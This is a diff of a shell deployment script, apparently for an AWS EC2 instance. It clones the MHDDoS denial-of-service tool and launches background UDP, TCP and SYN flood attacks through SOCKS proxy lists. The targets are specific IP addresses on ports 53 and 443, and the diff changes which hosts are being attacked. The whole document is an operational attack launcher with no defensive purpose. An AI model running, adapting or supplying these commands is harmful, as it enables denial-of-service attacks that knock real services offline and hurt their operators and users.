@@ -8,9 +8,11 @@ git clone https://github.com/MHProDev/MHDDoS.git
 cd MHDDoS
 pip3 install -r requirements.txt
 
-python3 start.py udp 217.175.155.100:53 5 999 socks5.txt 144 36000 > /home/ec2-user/MHDDoS.log 2>&1  &
-python3 start.py udp 217.175.155.12:53 5 999 socks5.txt 144 36000 > /home/ec2-user/MHDDoS.log 2>&1  &
-python3 start.py udp 217.175.140.71:53 5 999 socks5.txt 144 36000 > /home/ec2-user/MHDDoS.log 2>&1  &
+python3 start.py TCP 178.248.237.48:443 999 360000 5 socks.txt > /home/ec2-user/MHDDoS.log 2>&1  &
+python3 start.py SYN 178.248.237.48:443 999 360000 > /home/ec2-user/MHDDoS.log 2>&1  &
+#python3 start.py udp 217.175.155.100:53 5 999 socks5.txt 144 36000 > /home/ec2-user/MHDDoS.log 2>&1  &
+#python3 start.py udp 217.175.155.12:53 5 100 socks5.txt 100 360000 > /home/ec2-user/MHDDoS.log 2>&1  &
+#python3 start.py udp 217.175.140.71:53 5 999 socks5.txt 144 36000 > /home/ec2-user/MHDDoS.log 2>&1  &
 
 sleep 10;
 
